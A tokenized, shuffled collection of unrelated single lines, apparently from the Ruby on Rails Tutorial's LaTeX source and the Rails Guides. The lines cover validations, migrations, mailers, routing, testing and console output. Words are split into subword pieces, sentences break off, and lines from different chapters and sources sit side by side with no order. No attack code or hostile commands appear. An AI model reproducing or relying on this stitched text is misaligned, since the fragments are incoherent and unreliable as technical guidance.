▁As ▁usual , ▁you ▁should ▁check ▁that ▁the ▁tests ▁are ▁now ▁red :
▁* ▁ Allow s ▁the ▁method ▁to ▁be ▁overrid d en ▁if ▁` params [: _ method ]` ▁is ▁set ▖
▁Note ▁that , ▁a part ▁from ▁ having ▁\ k ode { Microposts Controller } ▁in ▁place ▁of ▁\ k ode { UsersController }, ▁Listing ~\ ref { code : demo _ microposts _ controller } ▁is ▁\ emph { id ent ical } ▁to ▁the ▁code ▁in ▁Listing ~\ ref { code : demo _ users _ controller } .
▁This ▁call ▁is ╼ re s p on s ible ▁for ▁is ol ating ▁the ▁controllers , ▁models , ▁routes ▁and ▁other ▁things ▁into ╼ the ir ▁own ▁ namespace , ▁a way ▁from ▁similar ▁ components ▁inside ▁the ▁application ▖╼
▁In ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ resets }, ▁we ' ll ▁make ▁\ emph { sure } ▁of ▁email ▁ validity ▁by ▁adding ▁a ▁separate ▁\ emph { account ▁activation } ▁step ▁to ▁user ▁signup .
▁creates ▁the ▁HTML ▁needed ▁to ▁make ▁a ▁ label ed ▁text ▁field ▁element ▁appropriate ▁for ▁setting ▁the ▁\ k ode { name } ▁attribute ▁of ▁a ▁User ▁model .
▁ Follow ing ▁the ▁model ▁in ▁Listing ~\ ref { code : name _ presence _ test }, ▁writing ▁a ▁test ▁for ▁\ k ode { email } ▁attribute ▁presence ▁is ▁easy ▁( Listing ~\ ref { code : email _ presence _ test }), ▁as ▁is ▁the ▁application ▁code ▁to ▁get ▁it ▁to ▁pass ▁( Listing ~\ ref { code : validates _ presence _ of _ email }) .
▁Rails ▁needs ▁to ▁know ╼ this ▁directory ▁to ▁generate ▁the ▁appropriate ▁routes :
▁But ▁it ' s ▁not ▁the ▁final ▁implementation ; ▁see ▁if ▁you ▁can ▁make ▁a ▁guess ▁about ▁why ▁not ▁before ▁mov ing ▁on ▁to ▁the ▁next ▁section .
▁=> ▁{" last _ name "=>" H ar t l ", ▁" first _ name "=>" Michael "}
▁as ▁show n ▁in ▁Listing ~\ ref { code : find _ authenticate _ user } .
▁We ▁will ▁add ▁a ▁uniqueness ▁validation ▁to ▁the ▁Relationship ▁model , ▁but ▁because ▁it ▁is ▁\ emph { al way s } ▁an ▁error ▁to ▁create ▁duplicate ▁relationships , ▁the ▁unique ▁index ▁is ▁ sufficient ▁for ▁now .
▁" foo \ n \ n bar "▖ indent (2) ▁# ▁=> ▁" ▁ foo \ n \ n ▁bar "
▁run ▁Rails ▖ application
▁create ▁app / views / users
▁If ▁your ▁application ▁current ly ▁depend ▁on ▁ MultiJSON ▁directly , ▁you ▁have ▁a ▁few ▁options :
▁#### ▁password _ field
▁setup ▁do
▁B oth ▁of ▁these ▁models ▁are ▁ professional - grade , ▁with ▁the ▁first ▁used ▁by ▁site s ▁such ▁as ▁\ href { http :// github ▖ com /}{ GitHub } ▁and ▁\ href { http :// bitbucket ▖ org /}{ Bitbucket }, ▁and ▁the ▁second ▁used ▁by ▁site s ▁such ▁as ▁\ href { http :// www ▖ fa ce book ▖ com /}{ Facebook } ▁and ▁\ href { http :// twitter ▖ com /}{ Twitter } .
▁Then ▁they ▁add ▁individual ▁\ emph { s c en ar io s } .
▁To ▁get ▁it ▁to ▁\ passing , ▁just ▁un comment ▁the ▁before ▁filter ▁( Listing ~\ ref { code : un comment ed _ before _ filter }) .
▁### ▁Generat ing ▁URLs ▁in ▁Action ▁Mailer ▁View s
▁You ▁can ▁also ▁include ▁all ▁style s ▁in ▁the ▁stylesheet ▁directory ▁using ▁: all ▁as ▁the ▁source :
▁If ▁you ╼ w an t ▁to ▁change ▁it , ▁you ▁can ▁use ▁` on : ▁: create ` ▁to ▁run ▁the ▁validation ▁only ▁when ▁a ╼ new ▁record ▁is ▁created ▁or ▁` on : ▁: update ` ▁to ▁run ▁the ▁validation ▁only ▁when ▁a ▁record ╼ is ▁updated .
▁They ▁should ▁be ▁used ▁with ▁caution .
▁render ▁plain : ▁" O K "
▁A ▁mockup ▁of ▁the ▁Home ▁page ▁with ▁a ▁form ▁for ▁creating ▁microposts .
▁The ▁generated ▁application ▁mailer .
▁A ▖ x ▁= ▁1
▁This ▁command ▁add s ▁all ▁the ▁files ▁in ▁the ▁current ▁directory ▁a part ▁from ▁those ▁that ▁match ▁the ▁pattern s ▁in ▁a ▁special ▁file ▁called ▁\ k ode { ▖ gitignore } .
▁And ▁I ▁sure ▁don ' t ▁remember ▁ever ▁calling ▁\ k ode { StaticPages Controller ▖ new } ▁any where .
▁This ▁allows ▁you ▁to ▁treat ▁instance s ▁of ▁your ▁models ▁as ▁URLs , ▁and ▁is ▁a ▁key ▁advantage ▁to ▁using ▁the ▁resource ful ▁style .
▁config ▖ assets ▖ compress ▁= ▁true
▁\ href { http :// r ailscasts ▖ com /}{ RailsCasts } ▁by ▁ Ryan ▁Bates : ▁E x ce ll ent ▁( mostly ▁free ) ▁Rails ▁ screencasts
▁The ▁signin ▁function s ▁themselves ▁will ▁end ▁up ▁ cross ing ▁the ▁ tr ad it ion al ▁Model - View - Controller ▁lines ; ▁in ▁particular , ▁sever al ▁signin ▁function s ▁will ▁need ▁to ▁be ▁available ▁in ▁both ▁controllers ▁and ▁views .
▁The ▁` last !` ▁method ▁be have s ▁exactly ▁like ▁` last `, ▁except ▁that ▁it ▁will ▁raise ▁` ActiveRecord :: RecordNotFound ` ▁if ▁no ▁matching ▁record ▁is ▁found .
▁There ▁are ▁sever al ▁pagination ▁methods ▁in ▁Rails ; ▁we ' ll ▁use ▁one ▁of ▁the ▁simple st ▁and ▁most ▁ r ob us t , ▁called ▁\ href { http :// wiki ▖ github ▖ com / mis la v / will _ paginate /}{ will \_ paginate } .
▁# ▁Use ▁ debugger
▁constraints ▁ subdomain : ▁' admin ' ▁do
▁All ▁three ▁browsers ▁include ▁a ▁built - in ▁`` In spec t ▁element '' ▁feature ▁available ▁by ▁right - ▁( or ▁control - ) click ing ▁on ▁any ▁part ▁of ▁the ▁page .
▁#< Client ▁id : ▁ 22 1, ▁first _ name : ▁" Russ el ">
▁The ▁page ▁title s ▁are ▁ al most ▁( but ▁not ▁quite ) ▁exactly ▁the ▁same .
▁* ▁Rails ▁4▖0 ▁ deprecated ▁` ActionController :: Abstract Request ` ▁in ▁favor ▁of ▁` ActionDispatch :: Request ` .
▁# ▁Return s ▁microposts ▁from ▁the ▁users ▁being ▁followed ▁by ▁the ▁given ▁user .
▁ ge ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 2 e 6 3 53 ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁a _ flash _ test ▁( end )╼╼ ▁% ▁section ▁login _ failure ▁( end )╼╼ ▁\ section { Log g ing ▁in } ▁% ▁( fold )╼ ▁\ label { sec : logging _ in }╼╼
▁* ▁` distinct `
▁As ▁a ▁result , ▁the ▁test ▁in ▁Listing ~\ ref { code : name _ presence _ test } ▁should ▁now ▁be ▁\ passing :
▁routes ▖ rb ▁# ▁N O
▁I ▁find ▁that ▁Cucumber ▁is ▁easy ▁to ▁read ▁and ▁a w k ward ▁to ▁write , ▁while ▁integration ▁tests ▁are ▁( for ▁a ▁programmer ) ▁a ▁little ▁hard er ▁to ▁read ▁and ▁\ emph { much } ▁easier ▁to ▁write .
▁With ▁models , ▁the ▁situation ▁is ▁different ; ▁as ▁you ▁may ▁recall ▁from ▁Section ~\ ref { sec : a _ controller _ class }, ▁the ▁Rails ▁console ▁automatically ▁load s ▁the ▁Rails ▁environment , ▁which ▁includes ▁the ▁models .
▁# ▁Person ▖ exists ?( '
▁* ▁How ▁to ▁use ▁nested ▁ layouts ▁( s ub - template s ) .
▁A ▁test ▁for ▁the ▁`` Users '' ▁link ▁URL .
▁Un safe ▁ Query ▁ Generation
▁( This ▁is ▁just ▁a ▁first ▁implementation ; ▁we ' ll ▁discuss ▁this ▁subject ▁again ▁in ▁Section ~\ ref { sec : account _ activations _ resource }, ▁where ▁we ' ll ▁use ▁the ▁preferred ▁\ emph { method ▁reference } ▁convention ▁for ▁defin ing ▁callbacks ▖)
▁As ▁construct ed , ▁only ▁admin s ▁can ▁destroy ▁users ▁through ▁the ▁web , ▁because ▁only ▁admin s ▁can ▁see ▁the ▁delete ▁links .
▁We ' ll ▁start ▁with ▁a ▁test ▁for ▁the ▁presence ▁of ▁a ▁\ k ode { name } ▁attribute .
▁You ▁can ▁configure ▁your ▁own ▁ builder ▁via ▁the ▁`: builder ` ▁option ▖
▁The ▁ distinct ion ▁is ▁in ▁where ▁you ▁place ▁the ▁foreign ▁key ▁( it ▁go es ▁on ▁the ▁table ▁for ▁the ▁class ▁declar ing ▁the ▁` belongs _ to ` ▁association ), ▁but ▁you ▁should ▁give ▁some ▁though t ▁to ▁the ▁actual ▁meaning ▁of ▁the ▁data ▁as ▁well ▖
▁=> ▁ ActionController :: M e t al
▁To ▁require ╼ confirmation , ▁make ▁sure ▁to ▁add ▁a ▁presence ▁check ▁for ▁the ▁confirmation ▁attribute ╼ ( we ' ll ▁take ▁a ▁look ▁at ▁` presence ` ▁later ▁on ▁this ▁guide ) :
▁Because ▁adding ▁Ajax ▁to ▁web ▁forms ▁is ▁a ▁common ▁practice , ▁Rails ▁make s ▁Ajax ▁easy ▁to ▁implement .
▁Generat ing ▁an ▁engine
▁For ▁example , ▁the ▁following :
▁* ▁available ▁in ▁this ▁directory ▁and ▁any ▁sub - d ir ec to r ies .
▁HTTP /1▖1 ▁200 ▁OK
▁( T hanks ▁to ▁reader ▁ K at ar z y na ▁S i we k ▁for ▁point ing ▁this ▁out ▖)
▁#### ▁image _ path
▁### ▁ NOT ▁Conditions
▁ Net work ▁traffic ▁is ▁ mostly ▁base d ▁on ▁the ▁ limited ▁We s ter n ▁ al ph a be t , ▁so ▁new ▁character ▁encoding s , ▁such ▁as ▁ Uni code , ▁e merge d , ▁to ▁ tr an s m it ▁characters ▁in ▁other ▁languages ▖
▁def ▁some _ method
▁It ▁doesn ' t ▁matter ▁much ▁what ▁name ▁you ▁use , ▁because ▁this ▁branch ▁will ▁only ▁exist ▁on ▁your ▁local ▁computer ▁and ▁your ▁person al ▁repository ▁on ▁GitHub ▖
▁This ▁will ▁output ▁the ▁following :
▁flash ▖ now [: alert ] ▁= ▁" You r ▁book ▁was ▁not ▁found "
▁That ▁comment ▁is ▁2 ▁spaces ▁a way ▁from ▁the ▁template :
▁This ▁is ╼ es pecially ▁useful ▁if ▁a ▁` default _ scope ` ▁is ▁specified ▁in ▁the ▁model ▁and ▁should ▁not ▁be ╼ app li ed ▁for ▁this ▁particular ▁query .
▁* ▁` Rails :: Rack :: Logger ` ▁not if ies ▁the ▁log s ▁that ▁the ▁request ▁has ▁be g un ▖
▁ bundler _ stub s /
▁# ▁</ object >
▁As ▁the ▁example ▁ de p ic t s , ▁the ▁`: db ` ▁format ▁generates ▁a ▁` BETWEEN ` ▁SQL ▁clause ▖
▁# ▁=> ▁[ [ "1" , ▁" 2 ", ▁"3"] , ▁[" 4 ", ▁"5" , ▁" 0 "] , ▁[" 6 ", ▁"7" , ▁" 0 " ]]
▁We ' ll ▁eliminate ▁them ▁in ▁Section ~\ ref { sec : professional _ grade _ deployment } ▖)
▁The ▁default ▁error ▁message ▁is ▁_" must ▁be ▁blank " _ .
▁te }╼╼ ▁% ▁subsection ▁ requiring _ the _ right _ user ▁( end )╼╼ ▁\ subsection { F ri end ly ▁ forwarding } ▁% ▁( fold )╼ ▁\ label { sec : friendly _ forwarding }╼╼
▁╼╼ ▁% ▁subsection ▁the _ asset _ pipeline ▁( end )╼╼ ▁\ subsection { S y nt ac tic ally ▁a wesome ▁stylesheets } ▁% ▁( fold )╼ ▁\ label { sec : sass }╼╼
▁The ▁method ▁for ▁ authenticating ▁users ▁will ▁be ▁to ▁take ▁a ▁submitted ▁password , ▁encrypt ▁it , ▁and ▁compare ▁the ▁result ▁to ▁the ▁ encrypted ▁value ▁store d ▁in ▁the ▁database .
▁"2013-03-11 ▁01:05:24" , ▁updated _ at : ▁"2013-03-11 ▁01:05:24" >
▁invoke ▁ css
▁If ▁you ' ve ▁ st udi ed ▁Ruby ▁before , ▁you ▁m ight ▁suspect ▁that ▁Rails ▁is ▁\ emph { yield ing } ▁the ▁contents ▁to ▁a ▁block , ▁and ▁your ▁ s us p ic ion ▁would ▁be ▁correct .
▁They ▁are ▁available ▁for ▁p ur cha se ▁through ▁the ▁\ href { http :// www ▖ railstutorial ▖ org /}{ Ruby ▁on ▁Rails ▁Tutorial ▁website } .
▁person ▁= ▁Person ▖ new ( name : ▁" J D ")
▁params ▖ require (: article )▖ permit (: title , ▁: text )
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : account _ activation _ edit _ action }, ▁you ▁should ▁now ▁be ▁able ▁to ▁ past e ▁in ▁the ▁URL ▁from ▁Listing ~\ ref { code : account _ activation _ email } ▁to ▁activate ▁the ▁relevant ▁user .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / duplicable ▖ rb ` .
▁# ▁=> ▁ { : a => { : b =>1 , ▁: c =>2} }
▁( In ▁particular , ▁it ▁won ' t ▁work ▁Ruby ▁1▖8▖7 ▖)
▁#### ▁` alias _ attribute `
▁ o c using
▁though ▁an ▁ anonymous ▁module ▁is ▁un reachable ▁by ▁definition .
▁The ▁reason ▁why ▁we ▁added ▁`@ article ▁= ▁Article ▖ new ` ▁in ▁the ▁` Article sController ` ▁is ╼ that ▁otherwise ▁`@ article ` ▁would ▁be ▁` nil ` ▁in ▁our ▁view , ▁and ▁calling ╼ `@ article ▖ errors ▖ any ?` ▁would ▁throw ▁an ▁error .
▁Having ▁created ▁a ▁working ▁\ k ode { user ▖ remember } ▁method , ▁we ' re ▁now ▁in ▁a ▁position ▁to ▁create ▁a ▁ persistent ▁session ▁by ▁storing ▁a ▁user ' s ▁( encrypted ) ▁id ▁and ▁remember ▁token ▁as ▁ permanent ▁cookies ▁on ▁the ▁browser .
▁The ▁( mostly ) ▁static ▁pages ▁for ▁the ▁sample ▁app .
▁Note ▁in ▁particular ▁that ▁t run c ation ▁take s ▁into ▁account ▁the ▁length ▁of ▁the ▁omission ▁string .
▁< form ▁accept - cha r set =" UT F -8 " ▁action ="/ articles " ▁class =" new _ article " ▁data - remote =" true " ▁id =" new _ article " ▁method =" post ">
▁( M e t a programming ▁is ▁one ▁of ▁Ruby ' s ▁ strong est ▁suit s , ▁and ▁many ▁of ▁the ▁`` magic '' ▁features ▁of ▁Rails ▁are ▁due ▁to ▁its ▁use ▁of ▁Ruby ▁ meta programming ▖)
▁t ▖ integer ▁: part _ id
▁* ▁X - Content - Type - Options
▁=> ▁[ 8, ▁17 , ▁42 ]
▁For ▁completeness , ▁Listing ~\ ref { code : gemfile _ carrierwave } ▁also ▁includes ▁the ▁\ text tt { mini \_ magic k } ▁and ▁\ text tt { fo g } ▁gems ▁needed ▁for ▁image ▁ resizing ▁( Section ~\ ref { sec : image _ resizing }) ▁and ▁image ▁upload ▁in ▁production ▁( Section ~\ ref { sec : image _ upload _ in _ production }) .
▁The ▁\ k ode { Application Controller } ▁class , ▁highlight ing ▁inheritance .
▁COM ▁A _ U S - ER @ f ▖ b ▖ org ▁f r st ▖ l st @ foo ▖ jp ▁a + b @ baz ▖ c n ]
▁Now ▁re - run ▁the ▁test ▁to ▁see ▁the ▁effect :
▁H e ▁found ▁that ▁in ▁this ╼ case ▁5 - 20 % ▁of ▁requests ▁will ▁not ▁be ▁cached ▖
▁### ▁ Updating ▁Article s
▁=> ▁[" a ", ▁" b ", ▁" c "]
▁| ▁HTTP ▁Verb ▁| ▁Path ▁| ▁Controller # Action ▁| ▁Use d ▁for ▁|
▁* ▁` secrets ▖ secret _ key _ base ` ▁is ▁used ▁for ▁specify ing ▁a ▁key ▁which ▁allows ▁sessions ▁for ▁the ▁application ▁to ▁be ▁verifie d ▁again st ▁a ▁known ▁secure ▁key ▁to ▁prevent ▁t amp er ing ▖
▁The ╼ ▁default ▁error ▁message ▁for ▁this ▁option ▁is ▁_" must ▁be ▁ o d d " _ .
▁The ▁migration ▁to ▁add ▁a ▁\ k ode { password \_ digest } ▁column ▁to ▁the ▁\ k ode { users } ▁table .
▁In ▁the ▁present ▁case , ▁all ▁the ▁ navbar ▁classes ▁have ▁special ▁meaning ▁to ▁the ▁Bootstrap ▁framework , ▁which ▁we ' ll ▁install ▁and ▁use ▁in ▁Section ~\ ref { sec : custom _ css } .
▁T hough ▁it ▁must ▁be ▁used ▁with ▁caution , ▁the ▁flexibility ▁to ▁add ▁methods ▁to ▁built - in ▁classes ▁allows ▁for ▁extra or dinarily ▁natural ▁addition s ▁to ▁plain ▁Ruby .
▁This ▁will ▁now ▁render ▁the ▁partial ▁in ▁` app / views / comments / _ comment ▖ html ▖ erb ` ▁once ╼ for ▁each ▁comment ▁that ▁is ▁in ▁the ▁`@ article ▖ comments ` ▁collection ▖
▁L uckily , ▁the ▁solution ▁is ▁straightforward ▁to ▁implement : ▁we ▁just ▁need ▁to ▁enforce ▁uniqueness ▁at ▁the ▁database ▁level ▁as ▁well ▁as ▁at ▁the ▁model ▁level .
▁You ▁m ight ▁also ▁consider ▁reading ▁the ▁first ▁few ▁chapter s ▁of ▁\ href { http :// www ▖ a mazon ▖ com / gp / product / 14 3022 36 34 }{\ emph { B eginning ▁Ruby } } ▁by ▁P eter ▁Cooper , ▁which ▁start s ▁with ▁sample ▁applications ▁much ▁small er ▁than ▁a ▁full - b low n ▁web ▁app .
▁The ▁\ k ode { form \_ for } ▁helper ▁is ▁used ▁to ▁make ▁forms ▁for ▁interact ing ▁with ▁Active ▁Record ▁objects .
▁* ▁After - initializers
▁When ▁using ▁one ▁of ▁the ▁methods ▁to ▁issue ▁HTTP ▁requests ▁directly , ▁we ▁get ▁access ▁to ▁the ▁ low - level ▁\ k ode { response } ▁object .
▁In ▁this ▁situation , ▁you ▁should ╼ ex p li c it ly ▁define ▁these ▁assets ▁for ▁pre com p i l ation ▖
▁Here ▁are ▁a ▁few ▁things ▁you ▁should ▁know ▁to ▁make ▁ efficient ▁use ▁of ▁Active ▁Record ▁associations ▁in ▁your ▁Rails ▁applications :
▁These ▁latter ▁methods ▁ const it ute ▁the ▁ idiomatic ally ▁correct ▁way ▁to ▁make ▁a ▁micropost , ▁name ly , ▁\ emph { through } ▁its ▁association ▁with ▁a ▁user .
▁TIP : ▁For ▁more ▁information ▁on ▁routing , ▁see ▁the ▁[ Rails ▁ Routing ]( routing ▖ html )╼ guid e .
▁More over , ▁Rails ▁has ▁a ▁feature ▁called ▁\ emph { migrations } ▁to ▁allow ▁data ▁definition s ▁to ▁be ▁written ▁in ▁p ure ▁Ruby , ▁without ▁ having ▁to ▁learn ▁an ▁SQL ▁data ▁definition ▁language ▁( D D L ) .
▁ / users / new
▁in ▁Listing ~\ ref { code : current _ user } .
▁The ▁directory ▁structure ▁for ▁a ▁new ly ▁created ▁Rails ▁app ▖ ~\ href { http :// railstutorial ▖ org / images / figures / directory _ structure _ rails _4_0 - full ▖ png }{( full ▁size )}
▁This ▁enable s ▁you ▁to ▁add ▁behavior ▁to ▁your ▁models ▁by ╼ tr an s parent ly ▁execut ing ▁code ▁when ▁those ▁events ▁occur , ▁like ▁when ▁you ▁create ▁a ▁new ╼ record , ▁update ▁it , ▁destroy ▁it ▁and ▁so ▁on ▖
▁Creat ing ▁and ▁saving ▁a ▁new ▁record ▁will ▁send ▁an ▁SQL ▁` INSERT ` ▁operation ▁to ▁the ╼ database ▖
▁The ▁\ k ode { UsersController } ▁class , ▁highlight ing ▁inheritance .
▁Even ▁though ▁the ▁content ▁will ▁be ▁restrict ed ▁to ▁few er ▁than ▁ 140 ▁characters ▁( Section ~\ ref { sec : micropost _ validations }) ▁and ▁hence ▁would ▁fit ▁inside ▁the ▁2 55 - character ▁\ k ode { string } ▁type , ▁using ▁\ k ode { text } ▁better ▁express es ▁the ▁nature ▁of ▁microposts , ▁which ▁are ▁more ▁natural ly ▁though t ▁of ▁as ▁blocks ▁of ▁text .
▁< li >`: smtp ` ▁( default ), ▁can ▁be ▁configured ▁by ▁using ▁` config ▖ action _ mailer ▖ smtp _ settings ` ▖ </ li >
▁Load ing ▁test ▁environment
▁ DateTime ▖ new ( 1582 , ▁10 , ▁4 , ▁ 23 ) ▁+ ▁1▖ hour
▁The ▁clean est ▁way ▁to ▁do ▁this ▁is ▁to ▁reset ▁the ▁database ▁with ▁the ▁\ k ode { db : migrate : reset } ▁Rake ▁task :
▁if ▁@ business
▁< Location ▁ / assets / >
▁WARNING : ▁You ▁should ▁not ▁specify ▁this ▁option ▁on ▁a ▁` belongs _ to ` ▁association ▁that ▁is ▁ connect ed ▁with ▁a ▁` has _ many ` ▁association ▁on ▁the ▁other ▁class ▖
▁would ▁be ▁reference d ▁in ▁a ▁manifest ▁like ▁this :
▁Because ▁of ▁its ▁ import ance , ▁it ' s ▁a ▁good ▁idea ▁to ▁write ▁a ▁test ▁for ▁any ▁attribute ▁that ▁isn ' t ▁edit able , ▁and ▁writing ▁such ▁a ▁test ▁for ▁the ▁\ k ode { admin } ▁attribute ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ administrative _ users }) .
▁# ▁=> ▁S tr ip ▁these ▁tags !
▁If ▁the ▁refer r ing ▁URL ▁is ▁\ k ode { nil } ▁( as ▁is ▁the ▁case ▁inside ▁some ▁tests ), ▁Listing ~\ ref { code : microposts _ destroy _ action } ▁set s ▁the ▁\ k ode { root \_ url } ▁as ▁the ▁default ▁using ▁the ▁\ k ode {||} ▁operator .
▁$ ▁bundle ▁exec ▁rake ▁test ╼ 3 ▁tests , ▁2 ▁assertions , ▁0 ▁failure s , ▁1 ▁errors , ▁0 ▁skip s
▁# ▁active _ record / model _ schema ▖ rb
▁from ▁Listing ~\ ref { code : errors _ partial } ▁to
▁$ ▁bin / rails ▁generate ▁mailer ▁User Mailer
▁In ▁particular , ▁we ▁can ▁replace ▁the ▁Ruby ▁code
▁Use ▁to ▁set ▁options ▁like ▁` from ` ▁or ▁` reply _ to ` ▁for ▁every ▁mailer ▖
▁To ▁do ▁all ▁this , ▁you ' ll ▁need ▁to ▁add ▁the ▁` attr _ accessor ` ▁for ▁` author _ name `, ▁the ╼ association ▁for ▁the ▁author ▁and ▁the ▁` before _ save ` ▁call ▁into ╼` app / models / blorgh / article ▖ rb ` ▖
▁[ U s ed ▁to ▁control ▁if ▁the ▁browser ▁is ▁allow ed ▁to ▁only ▁access ▁a ▁site ▁over ▁a ▁secure ▁connection ]( http :// en ▖ w ikipedia ▖ org / wiki / HTTP _ Strict _ Transport _ Security )
▁This ▁is ▁a ▁symbol ▁and ▁one ▁of ▁`: plain `, ▁`: login `, ▁`: c ra m _ md 5 ` .
▁As ▁usual , ▁we ▁add ▁the ▁\ k ode { admin } ▁attribute ▁with ▁a ▁migration , ▁indicat ing ▁the ▁\ k ode { boolean } ▁type ▁on ▁the ▁command ▁line :
▁On ▁Unix - like ▁systems ▁such ▁as ▁ Linux ▁and ▁OS ▁X , ▁user ▁and ▁system ▁task s ▁each ▁take ▁place ▁within ▁a ▁well - defined ▁ container ▁called ▁a ▁\ emph { process } .
▁Because ▁microposts ▁are ▁short ▁by ▁design , ▁the ▁\ k ode { string } ▁type ▁is ▁actually ▁big ▁enough ▁to ▁contain ▁them , ▁but ▁using ▁\ k ode { text } ▁better ▁express es ▁our ▁in t ent , ▁while ▁also ▁giv ing ▁us ▁ greater ▁flexibility ▁should ▁we ▁ever ▁wish ▁to ▁re la x ▁the ▁length ▁constraint .
▁# => ▁< p >< code > : to _ param </ code ></ p >
▁\ section { Co nclusion } ▁% ▁( fold )╼ ▁\ label { sec : advance d _ login _ co nclusion }╼╼
▁The ▁following ▁changes ▁are ▁mean t ▁for ▁upgrading ▁your ▁application ▁to ▁Rails ▁4▖0 .
▁To ▁disable ▁it ▁( and ▁allow ▁I 18 n ▁to ▁accept ▁* any * ▁ locale ▁option ) ▁add ▁the ▁following ╼ configuration ▁to ▁your ▁application :
▁We ' ll ▁see ▁the ▁technical ▁meaning ▁of ▁this ▁in ▁Section ~\ ref { sec : a _ class _ of _ our _ own }, ▁but ▁I ▁don ' t ▁think ▁any one ▁ever ▁under st ood ▁objects ▁by ▁reading ▁the ▁definition ▁in ▁a ▁book ; ▁you ▁have ▁to ▁build ▁up ▁your ▁in t u it ion ▁for ▁objects ▁by ▁see ing ▁lot s ▁of ▁examples .
▁By ▁default , ▁the ▁\ k ode { user ▖ microposts } ▁method ▁make s ▁no ▁guarantee s ▁about ▁the ▁order ▁of ▁the ▁posts , ▁but ▁( following ▁the ▁convention ▁of ▁blog s ▁and ▁Twitter ) ▁we ▁want ▁the ▁microposts ▁to ▁come ▁out ▁in ▁ reverse ▁order ▁of ▁when ▁they ▁were ▁created ▁so ▁that ▁the ▁most ▁ recent ▁post ▁is ▁first
▁ --- Bo b ▁C a ve z z a , ▁\ emph { Rails ▁Tutorial } ▁reader
▁Note ▁that ▁we ' ve ▁used ▁the ▁\ k ode { post \_ via \_ redirect } ▁variant ▁to ▁post ▁to ▁the ▁users ▁path .
▁B oo le an s ▁are ▁es pecially ▁useful ▁for ▁\ emph { control ▁ flow } :
▁* ▁How ▁to ▁create ▁job s .
▁As ▁a ▁rule ▁of ▁thumb , ▁extensions ▁to ▁` S o me Class ` ▁are ▁available ▁in ▁one ▁ sh o t ▁by ▁loading ▁` active _ support / core _ ext / some _ class ` .
▁P er man ent ▁cookies ▁are ▁vulnerable ▁to ▁a ▁\ emph { session ▁hijacking } ▁attack , ▁so ▁in ▁Section ~\ ref { sec : remember _ me } ▁we ' ll ▁have ▁to ▁be ▁much ▁more ▁careful ▁about ▁the ▁information ▁we ▁place ▁on ▁the ▁user ' s ▁browser .
▁| ▁| ▁20 6 ▁| ▁: partial _ content ▁|
▁* ▁` active _ support ▖ d eprecation _ be ha v i or ` ▁Set s ▁up ▁d eprecation ▁report ing ▁for ▁ environments , ▁default ing ▁to ▁`: log ` ▁for ▁development , ▁`: notify ` ▁for ▁production ▁and ▁`: s td er r ` ▁for ▁test ▖
▁If ▁you ' ve ▁found ▁a ▁bug ▁in ▁Ruby ▁on ▁Rails , ▁this ▁is ▁the ▁place ▁to ▁start ▖
▁There ▁are ▁also ▁some ▁optional ▁column ▁names ▁that ▁will ▁add ▁ additional ▁features ╼ to ▁Active ▁Record ▁instance s :
▁P o s s ible ▁values ▁are ▁`: cookie _ store ` ▁which ▁is ▁the ▁default , ▁`: me m _ cache _ store `, ▁and ▁`: disabled ` ▖
▁This ▁is ▁often ▁ factor ed ▁out ▁into ▁its ▁own ▁method ▁so ▁it ▁can ▁be ▁reuse d ▁by ▁multiple ╼ action s ▁in ▁the ▁same ▁controller , ▁for ▁example ▁` create ` ▁and ▁` update ` ▖
▁Ruby ▁on ▁Rails ╼ ▁Tutorial
▁Sometimes ▁you ▁wish ▁to ▁show ▁the ▁name ▁of ▁the ▁person ▁instead ▁of ▁just ▁their ▁email ╼ address ▁when ▁they ▁receive ▁the ▁email ▖
▁In ▁Chapter ~\ ref { cha : log _ in _ log _ out }, ▁we ' ll ▁then ▁use ▁the ▁authentication ▁machinery ▁from ▁Section ~\ ref { sec : adding _ a _ secure _ password } ▁to ▁let ▁users ▁log ▁into ▁the ▁site .
▁Un like ▁that ▁model , ▁the ▁present ▁Micropost ▁model ▁will ▁be ▁fully ▁test ed , ▁and ▁will ▁also ▁have ▁a ▁default ▁\ emph { ordering } ▁and ▁automatic ▁\ emph { destruction } ▁if ▁its ▁ parent ▁user ▁is ▁destroyed .
▁Return s ▁an ▁input ▁tag ▁of ▁the ▁" text " ▁type ▁tailor ed ▁for ▁access ing ▁a ▁specified ▁attribute .
▁When ▁you ▁want ▁to ▁call ▁a ▁method ▁on ▁an ▁object ▁only ▁if ▁it ▁is ▁not ▁` nil `, ▁the ▁simple st ▁way ▁to ▁achieve ▁it ▁is ▁with ▁ condition al ▁statement s , ▁adding ▁unnecessary ▁ clu tt er ▖
▁You ▁can ▁help ▁improve ▁the ▁Rails ▁ guides ▁by ▁making ▁them ▁more ▁co her ent , ▁consistent ▁or ▁read able , ▁adding ▁missing ▁information , ▁correct ing ▁f actual ▁errors , ▁fix ing ▁t y po s , ▁or ▁br ing ing ▁it ▁up ▁to ▁date ▁with ▁the ▁latest ▁ ed ge ▁Rails ▖
▁xml ▖ target (" name " ▁=> ▁" compile ", ▁" option " ▁=> ▁" fast ")
▁Note ▁the ▁use ▁of ▁\ k ode { validate } ▁( as ▁oppos ed ▁to ▁\ k ode { validates }) ▁to ▁call ▁a ▁custom ▁validation .
▁#### ▁Configur ing ▁an ▁SQLite 3 ▁Database
▁When ▁reach ing ▁a ▁natural ▁stop p ing ▁point ▁( such ▁as ▁before ▁a ▁commit ), ▁run ▁\ k ode { rspec ▁ spec / } ▁at ▁the ▁command ▁line ▁to ▁confirm ▁that ▁the ▁entire ▁test ▁suite ▁is ▁ still ▁green .
▁ Category ▖ includes ( articles : ▁[ { ▁comments : ▁: guest ▁ }, ▁: tags ]) ▖ find (1)
▁With ▁no ▁view ╼ available , ▁Rails ▁errors ▁out .
▁In ▁this ▁section , ▁we ' ll ▁create ▁a ▁signup ▁form ▁that ▁accept s ▁an ▁invalid ▁submission ▁and ▁re - render s ▁the ▁signup ▁page ▁with ▁a ▁list ▁of ▁errors , ▁as ▁ mock ed ▁up ▁in ▁Figure ~\ ref { fig : signup _ failure _ mockup } .
▁else
▁N a v ig ate ▁to ▁the ▁Rails ▁repository ▁you ▁just ▁push ed ▁to ▁( e ▖ g ▖╼ https :// github ▖ com / your - user - name / rails ) ▁and ▁click ▁on ▁" P u ll ▁ Request s " ▁seen ▁in ╼ the ▁right ▁pa n el ▖
